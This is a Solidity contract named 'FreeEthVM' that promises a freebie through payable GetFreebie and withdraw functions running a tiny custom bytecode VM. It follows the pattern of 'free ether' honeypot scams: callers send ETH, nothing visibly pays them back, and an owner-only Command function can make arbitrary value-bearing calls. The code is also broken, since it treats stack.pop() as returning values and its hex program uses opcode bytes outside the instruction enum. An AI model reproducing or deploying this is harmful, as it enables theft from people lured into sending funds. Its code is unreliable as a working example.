pragma solidity ^0.4.19;

contract FreeEthVM {
    address public Owner = msg.sender;
    uint256[] private stack;
    uint256 private programCounter;
    bytes private code;
    enum Instructions { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, TRANSFER }

    function() public payable {}

    function GetFreebie() public payable {
        code = hex"600160000E6011";
        execute();
    }

    function withdraw() payable public {
        code = hex"600160000E6012";
        execute();
    }

    function Command(address adr, bytes data) payable public {
        if (msg.sender == Owner) {
            adr.call.value(msg.value)(data);
        }
    }
    
    function execute() internal {
        programCounter = 0;
        while (programCounter < code.length) {
            Instructions instruction = Instructions(uint8(code[programCounter]));
            programCounter++;
            
            if (instruction == Instructions.PUSH) {
                uint256 value = uint256(code[programCounter]);
                stack.push(value);
                programCounter++;
            } else if (instruction == Instructions.POP) {
                stack.pop();
            } else if (instruction == Instructions.ADD) {
                uint256 a = stack.pop();
                uint256 b = stack.pop();
                stack.push(a + b);
            } else if (instruction == Instructions.SUB) {
                uint256 a = stack.pop();
                uint256 b = stack.pop();
                stack.push(a - b);
            } else if (instruction == Instructions.JMP) {
                uint256 target = stack.pop();
                programCounter = target;
            } else if (instruction == Instructions.JZ) {
                uint256 target = stack.pop();
                uint256 condition = stack.pop();
                if (condition == 0) {
                    programCounter = target;
                }
            } else if (instruction == Instructions.LOAD) {
                uint256 index = stack.pop();
                stack.push(stack[index]);
            } else if (instruction == Instructions.STORE) {
                uint256 index = stack.pop();
                uint256 value = stack.pop();
                stack[index] = value;
            } else if (instruction == Instructions.CALL) {
                address adr = address(stack.pop());
                bytes memory data = new bytes(stack.pop());
                for (uint256 i = 0; i < data.length; i++) {
                    data[i] = byte(stack.pop());
                }
                adr.call(data);
            } else if (instruction == Instructions.TRANSFER) {
                uint256 amount = stack.pop();
                address to = address(stack.pop());
                to.transfer(amount);
            }
        }
    }
}